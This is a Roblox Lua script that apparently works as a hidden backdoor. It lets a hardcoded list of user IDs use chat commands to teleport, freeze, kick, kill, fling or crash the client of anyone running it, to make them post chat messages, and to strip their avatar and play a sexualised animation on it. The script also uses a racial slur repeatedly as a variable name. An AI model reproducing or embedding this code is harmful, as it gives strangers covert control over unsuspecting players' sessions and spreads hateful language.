local player = game.Players.LocalPlayer
local isamod = false
local bending = false
local mods = {
    469000927, -- Ari
    246848510, -- Imagine
    163358789, -- Noah
    3182271938, -- Xaquh
    3019011749, -- Mark
    1109242822, -- Rus
    1914186457, -- R'
    697497383 -- Micheal
}

local function cmds(msg,plr)
	if isamod == false or table.find(mods,plr) then
		Mod = game.Players:GetPlayerByUserId(plr)
		isamod = table.find(mods,player.UserId)
		if msg == "!bring ." then
			if not isamod then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Mod.Character.HumanoidRootPart.CFrame
			end
		end

        if msg == "!freeze ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
			end
		end

        if msg == "!thaw ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end
		end

        if msg == ":kick ." then
			if not isamod then
                game.Players.LocalPlayer:Kick("Kicked by:"..Mod.Name)
			end
		end

        if msg == "!ban ." then
			if not isamod then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                wait()
                for i,nigger in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if nigger:IsA('BasePart') or nigger:IsA('Accessory') then
                        nigger:Destroy()
                    end
                end
                wait(2)
                game.Players.LocalPlayer:Kick("PERMA BAN")
			end
		end

        if msg == "!benx ." then
			if not isamod then
                bending = true
                local segtarget = Mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game:GetService('Players'):FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                end;
                Start()    
                repeat wait() until bending == false
                Pause()
			end
		end

        if msg == "!unbenx ." then
			if not isamod then
                repeat 
                    task.wait()
                    bending = false
                until not bending
			end
		end

        if msg == "!fling ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(999999, 999999, 999999)
			end
		end

        if msg == "!crash ." then
			if not isamod then
                while true do end
			end
		end

        if msg == "!kill ." then
			if not isamod then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
			end
		end
		
		if msg == "/e test" then
			if not isamod then
    local args = {
    [1] = "I'm here!",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))

			end
		end


        if msg == ":void ." then
			if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
			end
		end

        if msg == "!refresh ." then
			if not isamod then
                for i,nigger in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if nigger:IsA('BasePart') or nigger:IsA('Accessory') then
                        nigger:Destroy()
                    end
                end
			end
		end
    end
end

for i,v in pairs(game:GetService('Players'):GetChildren()) do
	if table.find(mods,v.UserId) then
		v.Chatted:Connect(function(msg)
			cmds(msg,v.UserId)
		end)
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	if table.find(mods,plr.UserId) then
		plr.Chatted:Connect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end)
